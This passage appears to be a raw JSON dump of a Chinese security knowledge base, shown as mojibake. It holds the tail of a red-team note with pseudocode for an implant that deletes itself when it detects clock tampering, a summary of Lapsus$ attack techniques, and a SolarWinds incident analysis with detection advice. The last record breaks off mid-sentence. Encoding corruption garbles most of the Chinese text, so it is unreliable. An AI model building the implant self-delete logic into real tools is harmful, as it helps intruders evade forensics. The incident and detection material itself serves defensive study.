yymmddHHMMSS çš„æ—¶é—´æˆ³åˆ›å»ºæ—¥å¿—æ–‡ä»¶ã€‚ ï¼ˆæ’å…¥æ–‡ä»¶çš„æ—¶é—´æˆ³åº”è¯¥ä¸æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ä¸€è‡´ï¼‰\r\n\r\nè‡ªæ¯çš„ç®—æ³•ä¼ªä»£ç å¦‚ä¸‹ï¼š\r\n\r\n```\r\n  last_time = 0 [This is the initial condition.] Set last_time to current time.\r\n  If current time > (last_time + CHECK_INTERVAL) AND (current time - last_time) â‰¤ MAX_TIME_DIFF (1 minute), then the system time is OK. If the time anomaly counter > 0, decrement it by 1, otherwise, check the file configuration time Set last_time to current time.\r\n  If current time > (last_time + CHECK_INTERVAL) AND (current time - last_time) > MAX_TIME_DIFF, then the system time changed. Increment time anomaly counter. Set last_time to current time.\r\n  If the current time < last_time, then the system time changed. Increment time anomaly counter. Set last_time to current time.\r\n  If the time anomaly counter > TIME_ANOMALY_LIMIT, then self delete.\r\n```\r\n\r\n# 7. å‚è€ƒ\r\n\r\n- [https://byt3bl33d3r.substack.com/p/taking-the-pain-out-of-c2-infrastructure-3c4?s=r](https://byt3bl33d3r.substack.com/p/taking-the-pain-out-of-c2-infrastructure-3c4?s=r)\r\n- [https://wikileaks.org/vault7/document/hive-Operating_Environment/hive-Operating_Environment.pdf](https://wikileaks.org/vault7/document/hive-Operating_Environment/hive-Operating_Environment.pdf)\r\n- [https://wikileaks.org/vault7/document/hive-Infrastructure-Switchblade/hive-Infrastructure-Switchblade.pdf](https://wikileaks.org/vault7/document/hive-Infrastructure-Switchblade/hive-Infrastructure-Switchblade.pdf)\r\n- [https://wikileaks.org/vault7/document/hive-DevelopersGuide/hive-DevelopersGuide.pdf](https://wikileaks.org/vault7/document/hive-DevelopersGuide/hive-DevelopersGuide.pdf)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[é‡å®šå‘å™¨ Redirectors]: ../Red TeamåŸºç¡€è®¾æ–½/é‡å®šå‘å™¨ Redirectors.md \"é‡å®šå‘å™¨ Redirectors\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/å®è·µå‚è€ƒ/Lapsus$ç»„ç»‡çš„æ‰‹æ³•/","title":"Lapsus$ç»„ç»‡çš„æ‰‹æ³•"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Lapsus$ç»„ç»‡çš„æ‰‹æ³•\r\ntags:\r\n- å®è·µå‚è€ƒ\r\n- Lapsus$\r\n- é’“é±¼\r\n- Microsoft\r\n---\r\n\r\n# 1. å¾®è½¯æŠ¥å‘Š\r\n\r\n3æœˆ22æ—¥ï¼Œå¾®è½¯MSTICã€DARTã€MS365 Defenderå¨èƒæƒ…æŠ¥å›¢é˜Ÿå‘å¸ƒäº†ã€ŠDEV-0537 criminal actor targeting organizations for data exfiltration and destructionã€‹æŠ¥å‘Šï¼Œè¯¦ç»†åˆ†æäº†æ”»å‡»è€…çš„æ”»å‡»æ‰‹æ³•ï¼ˆTTPsï¼‰ï¼Œå¹¶ç»™å‡ºäº†å®‰å…¨å»ºè®®\r\n\r\næ”»å‡»è€…æ”¶é›†äº†ç›®æ ‡çš„å¤§é‡ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šç»„ç»‡æ¶æ„ã€help deskï¼Œåº”æ€¥å“åº”æµç¨‹ã€ä¾›åº”é“¾å…³ç³»ç­‰ï¼Œä¸»è¦æ˜¯ç”¨äºå‘é€é’“é±¼é‚®ä»¶ï¼Œä»¥åŠé‡ç½®ç›®æ ‡ç”¨æˆ·çš„å‡­è¯ã€‚æ‰‹æ®µåŒ…æ‹¬ï¼š\r\n\r\n- éƒ¨ç½²Redline Stealeræ¶æ„è½¯ä»¶ï¼Œçªƒå–å¯†ç å’Œsession token\r\n- è´­ä¹°å‡­è¯å’Œsession token\r\n- å‘æ”»å‡»ç›®æ ‡ä¼ä¸šï¼ˆæˆ–ä¾›åº”å•†å’Œåˆä½œä¼™ä¼´ï¼‰çš„å‘˜å·¥è´­ä¹°è¯ä¹¦å’Œé€šè¿‡MFAè®¤è¯\r\n- åœ¨å…¬å…±ä»£ç åº“ä¸­æœç´¢å…¬å¼€å‡­æ®\r\n- ç„¶åä½¿ç”¨æ³„éœ²çš„å‡­è¯æˆ–session tokenè®¿é—®é¢å‘äº’è”ç½‘çš„ç³»ç»Ÿå’Œåº”ç”¨ï¼ŒåŒ…æ‹¬ï¼šVPNã€RDPã€VDIã€Oktaã€‚\r\n\r\nå¯¹äºä½¿ç”¨MFAçš„ç›®æ ‡ä¼ä¸šï¼Œæ”»å‡»è€…ç”¨ä¸¤ç§æŠ€æœ¯çªç ´MFAæœºåˆ¶ï¼šsession token replay and using stolen passwords\r\n\r\n- session token replay ä¼šè¯ä»¤ç‰Œé‡æ”¾å¯èƒ½æ˜¯å®ç°MFAåŠŸèƒ½æ—¶ä¸è§„èŒƒï¼Œä»£ç æœºåˆ¶åœ¨æ—¶æ•ˆã€èŒƒå›´æ—¶æœ‰é”™è¯¯ã€‚\r\n- using stolen passwords æ˜¯æŒ‡çªƒå–å¯†ç åï¼Œå†é’“é±¼è¯±å¯¼å—å®³è€…è§¦å‘ç‚¹å‡»MFAè®¤è¯é€šè¿‡çš„æç¤ºï¼ˆäºŒæ¬¡è®¤è¯çš„ç¡®è®¤æœºåˆ¶æ—¶getè¯·æ±‚ã€csrfé£é™©ã€æˆ–è€…æç¤ºä¸æ˜æ˜¾ï¼‰ã€‚\r\n- è¿˜æœ‰ä¸€ä¸ªå§¿åŠ¿æ˜¯çªƒå–å‘˜å·¥çš„ä¸ªäººé‚®ç®±ï¼Œé€šè¿‡ä¸ªäººè´¦æˆ·åšç¬¬äºŒå› ç´ èº«ä»½éªŒè¯æˆ–å¯†ç æ¢å¤ã€‚\r\n\r\né€šè¿‡æ‹›å‹Ÿç›®æ ‡ä¼ä¸šå‘˜å·¥æˆåŠŸè¿›å…¥æ”»å‡»ç›®æ ‡ï¼ˆå‘˜å·¥æä¾›èº«ä»½å‡­æ®å¹¶é€šè¿‡MFAçš„æç¤ºï¼Œæˆ–è€…å®‰è£…anydeskæˆ–å…¶ä»–è¿œç¨‹ç®¡ç†è½¯ä»¶ï¼‰\r\n\r\næ”»å‡»è€…è¿›å…¥ç›®æ ‡åï¼Œä¼šè®¿é—®JIRAã€Gitlabå’ŒConfluenceï¼ˆç”¨è¿™äº›è½¯ä»¶çš„ä¼ä¸šæ˜¯ä¸æ˜¯èŠèŠ±ä¸€ç´§^_^ï¼‰ï¼Œå¹¶å°è¯•ä½¿ç”¨JIRAã€Gitlabã€Confluenceçš„æ¼æ´è¿›è¡Œææƒï¼Œä»¥åŠä½¿ç”¨DC Syncã€Mimikatzã€Ntdsutil\r\n\r\næ”»å‡»è€…æ‹¥æœ‰ä¸“é—¨çš„ [[Red TeamåŸºç¡€è®¾æ–½]] ï¼Œè€Œä¸”çŸ¥é“ä¼ä¸šçš„å®‰å…¨æ£€æµ‹è§„åˆ™ï¼ˆä¸åŒåœ°ç†ä½ç½®ç™»å½•è´¦æˆ·çš„æ£€æµ‹ï¼‰ï¼Œä¼šé€‰æ‹©åœ°ç†ä¸Šä¸ç›®æ ‡ç›¸ä¼¼çš„VPNå‡ºå£ï¼Œç„¶åä»ç›®æ ‡ä¸‹è½½æ•æ„Ÿæ•°æ®\r\n\r\næ”»å‡»è€…ä¹Ÿä¼šå°è¯•æ”»å‡»ç›®æ ‡çš„äº‘ç§Ÿæˆ·ç‰¹æƒè´¦æˆ·ï¼ˆAWSã€Azureï¼‰ï¼Œå¹¶æœ‰åˆ›å»ºè´¦æˆ·å’Œåˆ é™¤æ•°æ®çš„è¡Œä¸º\r\n\r\næ”»å‡»è€…è¿˜ä¼šç›‘å¬ç»„ç»‡åº”æ€¥å“åº”å¤„ç½®å’Œå†…éƒ¨è®¨è®ºï¼ˆSlackã€Teamsã€ç”µè¯ä¼šè®®ï¼‰ï¼Œæ·±å…¥äº†è§£è¢«æ”»å‡»è€…çš„å¿ƒç†çŠ¶æ€\r\n\r\n# twitterç½‘å‹çˆ†æ–™Mandiantç»™oktaåšçš„åº”æ€¥æŠ¥å‘Š\r\n\r\nLapsus$å±…ç„¶ç”¨çš„éƒ½æ˜¯å¸¸ç”¨ã€é»˜è®¤çš„å·¥å…·ï¼Œæ²¡æœ‰é»‘é­”æ³•ï¼Œå¯è§å®‰å…¨åŸºç¡€èƒ½åŠ›çš„é‡è¦æ€§ï¼Œå¾ˆå¤šå…¬å¸åœ°åŸºæ²¡æ‰“å¥½å°±å¼€å§‹é€ é«˜æ¥¼äº†\r\n\r\n- ![UK3hmN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/UK3hmN.jpg)\r\n- ![Nr8Pvg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/Nr8Pvg.jpg)\r\n\r\n# æ€è€ƒ\r\n\r\nå›½å¤–å®‰å…¨å…¬å¸çš„æ–‡åŒ–å°±æ˜¯ä¼šå…¬å¼€é€æ˜å¯¹å¾…å®‰å…¨äº‹ä»¶ï¼Œè¿™ç‚¹éš¾èƒ½å¯è´µï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»ä¸­å­¦åˆ°å¾ˆå¤šï¼Œæ­¤æ¬¡LAPSUS$äº‹ä»¶ï¼Œç›¸å…³å…¬å¸ä¹Ÿåšäº†å…¬å¼€æŠ«éœ²ï¼Œå‚è€ƒ\r\n\r\n- Cloudflare\r\n  - https://blog.cloudflare.com/cloudflare-investigation-of-the-january-2022-okta-compromise/\r\n- Okta\r\n  - https://www.okta.com/blog/2022/03/oktas-investigation-of-the-january-2022-compromise/\r\n\r\nå…¶ä»–äº‹ä»¶çš„ç”³æ˜åŒ…æ‹¬ï¼š\r\n\r\n- [[AWS çš„ S3 æ•…éšœå›é¡¾å’Œæ€è€ƒ]]\r\n- [Gitlabè¯¯åˆ æ•°æ®](https://about.gitlab.com/blog/2017/02/01/gitlab-dot-com-database-incident/)\r\n\r\n# å‚è€ƒèµ„æ–™\r\n\r\n- [https://mp.weixin.qq.com/s/AG-ITyHlwesxS2k-5BzgKg](https://mp.weixin.qq.com/s/AG-ITyHlwesxS2k-5BzgKg)\r\n- [https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/](https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[AWS çš„ S3 æ•…éšœå›é¡¾å’Œæ€è€ƒ]: ../è¡Œä¸šè§‚å¯Ÿ/AWS/AWS çš„ S3 æ•…éšœå›é¡¾å’Œæ€è€ƒ.md \"AWS çš„ S3 æ•…éšœå›é¡¾å’Œæ€è€ƒ\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/å®è·µå‚è€ƒ/SolarWindsäº‹ä»¶/","title":"SolarWindsäº‹ä»¶"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: SolarWindsäº‹ä»¶\r\ntags:\r\n- å®è·µå‚è€ƒ\r\n- SolarWinds\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\n\r\n2020 å¹´ï¼Œä¸€åœºé‡å¤§ç½‘ç»œæ”»å‡»æ¸—é€åˆ°å…¨çƒæ•°åƒä¸ªç»„ç»‡ï¼ŒåŒ…æ‹¬ç¾å›½è”é‚¦æ”¿åºœçš„å¤šä¸ªéƒ¨é—¨ï¼Œå¯¼è‡´ä¸€ç³»åˆ—æ•°æ®æ³„éœ²äº‹ä»¶ã€‚æ®æŠ¥é“ï¼Œç”±äºç›®æ ‡çš„æ•æ„Ÿæ€§å’Œé«˜çŸ¥ååº¦ä»¥åŠæŒç»­æ—¶é—´é•¿ï¼ˆå…«åˆ°ä¹ä¸ªæœˆï¼‰ï¼Œç½‘ç»œæ”»å‡»å’Œæ•°æ®æ³„éœ²äº‹ä»¶æ˜¯ç¾å›½æœ‰å²ä»¥æ¥é­å—çš„æœ€ä¸¥é‡çš„ç½‘ç»œé—´è°äº‹ä»¶ä¹‹ä¸€) é»‘å®¢å¯ä»¥è®¿é—®çš„åœ°æ–¹ã€‚åœ¨å…¶è¢«å‘ç°åçš„å‡ å¤©å†…ï¼Œæ®æŠ¥é“å…¨çƒè‡³å°‘æœ‰ 200 ä¸ªç»„ç»‡å—åˆ°äº†æ”»å‡»çš„å½±å“ï¼Œå…¶ä¸­ä¸€äº›å¯èƒ½è¿˜é­å—äº†æ•°æ®æ³„éœ²ã€‚å…¨çƒå—å½±å“çš„ç»„ç»‡åŒ…æ‹¬åŒ—çº¦ã€è‹±å›½æ”¿åºœã€æ¬§æ´²è®®ä¼šã€å¾®è½¯ç­‰ã€‚\r\n\r\nè¯¥æ”»å‡»æ•°æœˆæœªè¢«å‘ç°ï¼Œäº 2020 å¹´ 12 æœˆ 13 æ—¥é¦–æ¬¡å…¬å¼€æŠ¥é“ï¼Œæœ€åˆåªçŸ¥é“å½±å“äº†ç¾å›½è´¢æ”¿éƒ¨å’Œå›½å®¶ç”µä¿¡å’Œä¿¡æ¯ç®¡ç†å±€(NTIA)ï¼Œéƒ¨åˆ†ç¾å›½å•†åŠ¡éƒ¨çš„ã€‚åœ¨æ¥ä¸‹æ¥çš„å‡ å¤©é‡Œï¼Œæ›´å¤šçš„éƒ¨é—¨å’Œç§äººç»„ç»‡æŠ¥å‘Šäº†è¿è§„è¡Œä¸ºã€‚\r\n\r\n![KWaNqM](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/KWaNqM.jpg)\r\n\r\n# 2. SolarWinds æ”»å‡»çš„ä¸‰ä¸ªä¸»è¦é˜¶æ®µ\r\n\r\n**æ”»å‡»é˜¶æ®µ 1ï¼šå…¥ä¾µæ§åˆ¶ Orion**\r\n\r\n- è™½ç„¶å°šä¸æ¸…æ¥šæ”»å‡»è€…æœ€åˆæ˜¯å¦‚ä½•å…¥ä¾µ SolarWinds Orionçš„ï¼Œä½†æ®æŠ¥é“ä»–ä»¬åœ¨å‘èµ·æ”»å‡»å‰ï¼Œå­¦ä¹ äº†å¾ˆå¤šè¯¥å…¬å¸çš„ä»£ç ç»“æ„å’Œæœ¯è¯­ï¼Œå¯¹è¯¥å…¬å¸éå¸¸äº†è§£ï¼›å› æ­¤ä»–ä»¬ä¸€æ—¦è¿›å…¥å†…ç½‘ä¾¿å¿«é€Ÿè”“å»¶ï¼ˆå¯¹èµ„æºå……è¶³çš„æ”»å‡»è€…æ¥è¯´ï¼Œå‡ ä¹æ€»èƒ½æ‰¾åˆ°è¿›å…¥å†…éƒ¨çš„æ–¹æ³•ï¼›è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦[[Assume Breach]]ï¼‰ã€‚\r\n- ä¸ºäº†åœ¨ç»„ç»‡ä¸­ç«™ç¨³è„šè·Ÿï¼Œæ”»å‡»è€…å…¥ä¾µäº† CI/CD çš„pipelineï¼ˆåŒ…æ‹¬DevOpsè¿‡ç¨‹ä¸­çš„æµ‹è¯•ã€æ‰“åŒ…ã€æ„å»ºå’Œç­¾åï¼‰ï¼Œä»è€ŒæˆåŠŸæ›´æ”¹äº† SolarWinds çš„æºä»£ç ã€‚ä¹‹åæ”»å‡»è€…éƒ¨ç½²äº†â€œSunSpotâ€æ¶æ„è½¯ä»¶ï¼Œå®ƒä»¥é«˜æƒé™è¿è¡Œï¼Œæ‰«æ Orion ç‰ˆæœ¬ã€‚\r\n\r\n**æ”»å‡»é˜¶æ®µ 2ï¼šç„å‡† SolarWinds å®¢æˆ·**\r\n\r\n- åœ¨å¤§çº¦ä¸¤å‘¨çš„ä¼‘çœ æœŸåï¼ˆæ•…æ„æš‚åœå¸®åŠ©æ”»å‡»è€…æ©ç›–è¸ªè¿¹ï¼‰ï¼Œæ¶æ„æœ‰æ•ˆè½½è·å¼€å§‹è¿›è¡Œä¸€äº›ä¾¦å¯Ÿå’Œæ“ä½œå®‰å…¨æ£€æŸ¥ï¼ˆå¦‚æœåœ¨ç¯å¢ƒä¸­è¯†åˆ«å‡ºæ­¤â€œæ¸…å•â€ä¸Šçš„ä»£ç†æˆ–å·¥å…·ï¼Œåˆ™æ¶æ„è½¯ä»¶ä¼šå°è¯•ç»ˆæ­¢ä»£ç†æˆ–è‡ªè¡ŒæŒ‚èµ·ï¼‰ã€‚\r\n- ç„¶è€Œï¼Œå¦‚æœæ¶æ„è½¯ä»¶æ²¡æœ‰æ‰¾åˆ°è¿™äº›ç‰¹å®šçš„å“ˆå¸Œå€¼ï¼Œå®ƒå°±ä¼šè¿›å…¥ä¸‹ä¸€ä¸ªé˜¶æ®µï¼šä» C&C æœåŠ¡å™¨åˆ†æ´¾å‘½ä»¤å¹¶ç¦ç”¨ä»»ä½•æ˜“å—æ”»å‡»çš„ç»ˆç«¯agentã€‚\r\n- ç”±äº Orion ä½œä¸ºå—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºè¿æ¥åˆ°å®¢æˆ·çš„ Office 365 å¸æˆ·ï¼Œå› æ­¤æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®ç”µå­é‚®ä»¶å’Œå…¶ä»–æœºå¯†æ–‡æ¡£ã€‚\r\n\r\n**æ”»å‡»é˜¶æ®µ 3ï¼šå‘é«˜ä»·å€¼ç›®æ ‡ææƒ**\r\n\r\n- æ ¹æ®æŠ¥é“ï¼Œæ”»å‡»è€…å¾ˆå¯èƒ½è·å–äº†å­˜å‚¨åœ¨ Orion æ•°æ®åº“ä¸­çš„å‡­æ®ï¼Œä¾‹å¦‚ Active Directoryã€é˜²ç«å¢™ã€åŸºç¡€è®¾æ–½å’Œç½‘ç»œç®¡ç†è½¯ä»¶ç­‰ä¼ ç»Ÿ Tier0 çš„èµ„äº§ã€‚è¿™å°†å®ç°ç‰¹æƒçš„å¿«é€Ÿå‡çº§ã€‚æœ‰äº†è¿™äº›å¼ºå¤§çš„å‡­æ®ï¼Œæ”»å‡»è€…å°±å¯ä»¥ç«‹å³æ§åˆ¶ç›®æ ‡ç½‘ç»œã€‚\r\n\r\n# 3. Fireeyeå‘å¸ƒåˆ†ææŠ¥å‘Šå’Œæ£€æµ‹è§„åˆ™\r\n\r\n2020 å¹´ 12 æœˆ 8 æ—¥ï¼Œç½‘ç»œå®‰å…¨å…¬å¸FireEyeå®£å¸ƒçº¢é˜Ÿå·¥å…·è¢«å®ƒè®¤ä¸ºæ˜¯å›½å®¶èµ„åŠ©çš„æ”»å‡»è€…çªƒå–ã€‚FireEye è¢«è®¤ä¸ºæ˜¯ä¿„ç½—æ–¯å¤–å›½æƒ…æŠ¥å±€SVRçš„ç›®æ ‡ã€‚FireEye è¡¨ç¤ºï¼Œå®ƒåœ¨è°ƒæŸ¥ FireEye è‡ªèº«çš„æ¼æ´å’Œå·¥å…·ç›—çªƒçš„è¿‡ç¨‹ä¸­å‘ç°äº† SolarWinds ä¾›åº”é“¾æ”»å‡»ã€‚\r\n\r\nåˆ†ææŠ¥å‘Šè§\r\n\r\n- https://www.mandiant.com/resources/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor\r\n\r\nå…¬å¼€æ£€æµ‹è§„åˆ™è§\r\n\r\n- https://github.com/mandiant/sunburst_countermeasures\r\n\r\n# 4. è½¬è½½ï¼šåæ§½å›½å†…å¯¹SolarWindsäº‹ä»¶çš„åˆ†æ\r\n\r\n- æ¥æº\r\n  - https://mp.weixin.qq.com/s/ytm62hJ59XIDi-QRlZTfEg\r\n- FireEyeåœ¨è‡ªå·±çš„åšå®¢é‡Œé¢ç»™äº†å‡ ä¸ªæ£€æµ‹å»ºè®®ï¼Œæˆ‘è§‰å¾—éå¸¸å¥½ï¼Œåšç”²æ–¹å®‰å…¨çš„åŒèƒä»¬å¥½å¥½çœ‹çœ‹ï¼Œæ˜¯ä¸æ˜¯å¯¹å¾…è¿™ç§ç‹‚é…·ç‚«æ‹½åŠç‚¸å¤©çš„ä¾›åº”é“¾ï¼Œæˆ‘ä»¬å°±å®Œå…¨æ²¡è¾™äº†ä¹ˆï¼Ÿå…¶å®è¿˜æ˜¯æœ‰æœºä¼šæä¸€æçš„ï¼Œå°±çœ‹ä½ è®¤ä¸è®¤çœŸäº†ã€‚\r\n  - æ”»å‡»è€…çš„åé—¨ç”¨çš„æ˜¯åˆæ³•çš„SolarWindsçš„æ•°å­—ç­¾åï¼Œæ²¡è¾™ã€‚\r\n  - æ”»å‡»è€…çš„é€šä¿¡åè®®æ¨¡ä»¿çš„æ˜¯SolarWindsçš„APIè°ƒç”¨ï¼Œæ²¡è¾™ã€‚\r\n  - ä»è¿›ç¨‹æ ‘ä¸Šçœ‹æ¥ï¼Œå°±æ˜¯SolarWindsè¿›ç¨‹çš„æ“ä½œï¼Œæ²¡è¾™ã€‚\r\n  - æ”»å‡»è€…æŠŠä»–ä»¬çš„C2çš„hostnameæ”¹æˆå—å®³è€…ç¯å¢ƒé‡Œé¢çš„hostnameï¼Œæ›´å®¹æ˜“è¿·æƒ‘å¤„ç½®äººå‘˜ã€‚è¿™ä¸ªåœ°æ–¹å¯ä»¥äº‹åè¿›è¡ŒHuntingï¼Œæ²¡æ³•äº‹ä¸­è¿›è¡Œæ£€æµ‹ã€‚\r\n    **å¯ä»¥æ®æ­¤ä½¿ç”¨ç½‘ç»œæµ‹ç»˜æ•°æ®è¿›è¡ŒHuntingã€‚ä¾‹å¦‚ä½¿ç”¨zoomeye æˆ–è€… shodan ï¼ŒæŸ¥çœ‹å…¨ç½‘é‡Œé¢RDPçš„è¯ä¹¦æ˜¯å¦æœ‰ä½ ä»¬å…¬å¸çš„ã€‚å¦‚æœæœ‰çš„è¯ï¼Œç¡®è®¤ä¸‹æ˜¯å¦çœŸå®æ˜¯ä½ ä»¬å…¬å¸çš„èµ„äº§ã€‚å¦‚æœä¸æ˜¯ï¼Œåæœ‰å…«ä¹è¢«ç”¨æ¥å¹²ä½ ä»¬çš„ã€‚ï¼ˆæ­¤å¤„éœ€@heigeï¼‰**\r\n  - æ”»å‡»è€…çš„C2 IPä¸ºäº†èº²é¿æ£€æµ‹ï¼Œéƒ½ç”¨çš„è·Ÿå—å®³å…¬å¸åŒä¸€ä¸ªå›½å®¶çš„VPSã€‚å¦‚æœæ”»å‡»è€…ä½¿ç”¨C2 IPæ¥è®¿é—®è¢«æçš„è´¦æˆ·ï¼Œä¼ä¸šå¯ä»¥é€šè¿‡è´¦æˆ·å¼‚å¸¸æ¥æ£€æµ‹åˆ°è¿™ä¸ªæ”»å‡»ã€‚\r\n    **è¿™ä¸ªåœ°æ–¹æé»‘äº§çš„å¥½åƒéƒ½æ˜¯å…±è¯†äº†ï¼Œä½¿ç”¨è¢«æ”»å‡»è´¦æˆ·çš„åŒä¸€ä¸ªçœå¸‚çš„æ‹¨å·IPï¼Œè¿è´¦å·å¼‚å¸¸éƒ½å¾ˆéš¾è§¦å‘ã€‚å®é™…æ£€æµ‹ä¸­è¦ç»“åˆè®¾å¤‡ç¯å¢ƒä¿¡æ¯å’Œè´¦æˆ·æ“ä½œä¹ æƒ¯ä¿¡æ¯æ¥æ›´å¥½çš„åˆ¤å®šã€‚**\r\n  - æ”»å‡»è€…é€šè¿‡è·å–çš„å‡­è¯è¿›å…¥ç½‘ç»œåï¼Œä»–ä»¬ä¼šä½¿ç”¨å¤šä¸ªä¸åŒçš„è´¦æˆ·å‡­è¯è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚ç”¨æ¥æ¨ªå‘ç§»åŠ¨çš„å‡­è¯ä¸ä¼šå’Œè¿›å…¥ç½‘ç»œçš„è´¦æˆ·å‡­è¯ä¸€è‡´ã€‚é¿å…æ¨ªå‘ç§»åŠ¨è¢«å‘ç°åï¼Œç½‘ç»œæƒé™ä¹Ÿè¢«å¹²æ‰äº†ã€‚\r\n    **è¿™é‡Œå¯ä»¥é€šè¿‡æ£€æµ‹æ˜¯å¦æœ‰ä¸€ä¸ªç³»ç»Ÿå¯¹å¤šä¸ªç³»ç»Ÿä½¿ç”¨å¤šä¸ªä¸åŒè´¦å·è¿›è¡Œæ‰¹é‡ç™»å½•å°è¯•çš„è¡Œä¸ºã€‚**\r\n  - æ”»å‡»è€…å…ˆæŠŠè¢«æ§æœºå™¨ä¸Šåˆæ³•çš„æ–‡ä»¶æ›¿æ¢æˆä»–ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œæ¶æ„æ–‡ä»¶ï¼Œä¹‹åå†æŠŠåˆæ³•æ–‡ä»¶æ›¿æ¢å›å»ã€‚ä¾‹å¦‚ï¼ŒæŠŠä½ ç”µè„‘ä¸Šçš„notepadæ›¿æ¢æˆä»–çš„æ¶æ„notepadï¼Œç„¶åä»–æ‰§è¡Œä¸‹æ¶æ„notepadï¼Œæ‰§è¡Œå®Œæ¶æ„notepadï¼Œå†æ¢å¤åˆ°åˆæ³•çš„notepadã€‚\r\n    **è¿™ä¸ªåœ°æ–¹åšæ£€æµ‹çš„äººåº”è¯¥ä¼šå¾ˆæœ‰æ„Ÿè§¦ï¼Œå¦‚æœEDRçš„æ—¥å¿—é‡Œé¢åªè®°å½•äº†è¿›ç¨‹è°ƒç”¨ä¿¡æ¯ï¼Œä½†æ²¡è®°å½•è¿›ç¨‹çš„MD5ï¼Œå…‰çœ‹æ—¥å¿—ï¼Œæ˜¯è¯†åˆ«ä¸å‡ºæ¥è¿™æ¬¡çš„æ¶æ„æ“ä½œçš„ã€‚å½“ç„¶ï¼Œå¦‚æœæ›¿æ¢çš„æ¶æ„notepadæœ¬èº«åšçš„äº‹æƒ…æ¯”è¾ƒæ˜æ˜¾ï¼Œä¹Ÿä¼šè¢«å‘Šè­¦ã€‚å¦‚æœåšçš„åŠ¨ä½œæ²¡é‚£ä¹ˆå¤§ï¼Œè¿™ä¸ªå‘Šè­¦ç™¾åˆ†ç™¾ä¼šè¢«å¿½ç•¥æ‰ã€‚å³ä½¿è®°å½•äº†è¿›ç¨‹MD5ï¼Œå¤„ç½®äººå‘˜å¾ˆå¯èƒ½ä¹Ÿä¼šå¿½ç•¥ã€‚æ²¡æœ‰å‡ ä¸ªäººæƒ³åˆ°è¿˜å»å¯¹æ¯”ä¸‹å‰åMD5æ˜¯å¦ä¸€è‡´ã€‚**\r\n    **è¿™é‡ŒFireEyeç»™çš„å»ºè®®æ˜¯å¯¹è¿™ç§çŸ­æ—¶é—´å†…åˆ›å»ºæ‰§è¡Œåˆ é™¤å†åˆ›å»ºçš„è¡Œä¸ºè¿›è¡Œå‘Šè­¦ã€‚ï¼ˆæ•²é»‘æ¿ï¼Œè¿™ä¸ªåœ°æ–¹å…¶å®æ˜¯è®©å¤§å®¶åœ¨æ£€æµ‹é‡Œé¢å¤šå¢åŠ ä¸€ç§å¼‚å¸¸è¡Œä¸ºç»´åº¦ï¼‰**\r\n  - æ”»å‡»è€…æŠŠåŸæ¥åˆæ³•çš„è®¡åˆ’ä»»åŠ¡æ›¿æ¢æˆä»–ä»¬è¦æ‰§è¡Œçš„æ–‡ä»¶ï¼Œæ‰§è¡Œå®Œå†æ¢å¤åˆ°åŸå§‹è®¡åˆ’ä»»åŠ¡ã€‚\r\n    **è¿™é‡ŒFireEyeç»™å‡ºçš„å»ºè®®æ˜¯ç›‘æ§è¿™ç§ä¸´æ—¶çš„è®¡åˆ’ä»»åŠ¡ä¿®æ”¹ï¼Œé€šè¿‡é¢‘ç‡åˆ†ææ¥è¯†åˆ«è¿™ç§å¼‚å¸¸è®¡åˆ’ä»»åŠ¡æ›´æ”¹ã€‚**\r\n  - ä¸Šçº¿ä½¿ç”¨DGAåŸŸåï¼Œè¿™ä¸ªåœ°æ–¹å¤§å®¶å¯ä»¥æ·±å…¥çœ‹ä¸‹ã€‚äººå·¥æ™ºèƒ½æ¥è§£å†³å®‰å…¨é—®é¢˜å‰å‡ å¹´ä¸æ˜¯ç‚’çš„å¾ˆçƒ­ä¹ˆï¼Ÿæ£€éªŒä½ ä»¬æˆæœçš„æ—¶åˆ»åˆ°äº†ã€‚\r\n  - æ”»å‡»è€…é€šè¿‡å…ˆå‰è·å–çš„ç®¡ç†å‘˜æƒé™è¿›ä¸€æ­¥è·å–è¢«æ”»å‡»çš„ç»„ç»‡çš„ å¯ä¿¡SAML tokenç­¾åè¯ä¹¦ï¼Œé€šè¿‡è¿™ä¸ªä»–ä»¬å¯ä»¥ä¼ªé€ æˆç»„ç»‡å†…ä»»ä½•ä¸€ä¸ªé«˜æƒé™è´¦æˆ·çš„SAML tokenï¼ˆå¯ä»¥ç†è§£æˆæå®šäº†ä¸€ä¸ªaccesskeyçš„ç”Ÿæˆè¯ä¹¦ï¼‰ã€‚\r\n  - ä½¿ç”¨è¿™ä¸ªå¯ä¿¡çš„SAML tokenç­¾åè¯ä¹¦åˆ›å»ºçš„SAML tokenï¼Œå¯ä»¥å¯¹ä¿¡ä»»è¯¥è¯ä¹¦çš„ä»»æ„äº‘ç¯å¢ƒèµ„æºè¿›è¡Œè®¿é—®ã€‚å› 